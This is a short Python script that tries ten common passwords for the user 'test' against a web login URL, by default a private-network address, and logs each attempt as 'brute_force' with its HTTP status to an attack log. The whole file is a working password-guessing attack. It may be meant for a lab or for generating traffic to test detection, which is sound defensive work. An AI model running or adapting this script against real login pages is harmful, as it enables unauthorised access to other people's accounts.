import requests
import datetime
import os
import time

try:
    from dotenv import load_dotenv
except ImportError:
    load_dotenv = None

if load_dotenv:
    load_dotenv()

url = os.environ.get("TARGET_LOGIN_URL", "http://192.168.2.100:5000/login")
log_file = os.environ.get("ATTACK_LOG_FILE", "attack.log")

payloads = [
    {"username": "test", "password": "1111"},
    {"username": "test", "password": "1234"},
    {"username": "test", "password": "admin"},
    {"username": "test", "password": "password"},
    {"username": "test", "password": "qwer"},
    {"username": "test", "password": "asdf"},
    {"username": "test", "password": "zxcv"},
    {"username": "test", "password": "0000"},
    {"username": "test", "password": "9999"},
    {"username": "test", "password": "guest"},
]

def write_log(message: str) -> None:
    with open(log_file, "a", encoding="utf-8") as f:
        f.write(message + "\n")

for i, data in enumerate(payloads, start=1):
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    try:
        res = requests.post(
            url,
            data=data,
            timeout=5
        )

        log_line = (
            f"{now} | brute_force | attempt={i} | "
            f"user={data['username']} | pw_length={len(data['password'])} | status={res.status_code}"
        )
        print(log_line)
        write_log(log_line)

    except requests.RequestException as e:
        log_line = (
            f"{now} | brute_force | attempt={i} | "
            f"user={data['username']} | pw_length={len(data['password'])} | error={e}"
        )
        print(log_line)
        write_log(log_line)

    time.sleep(0.5)
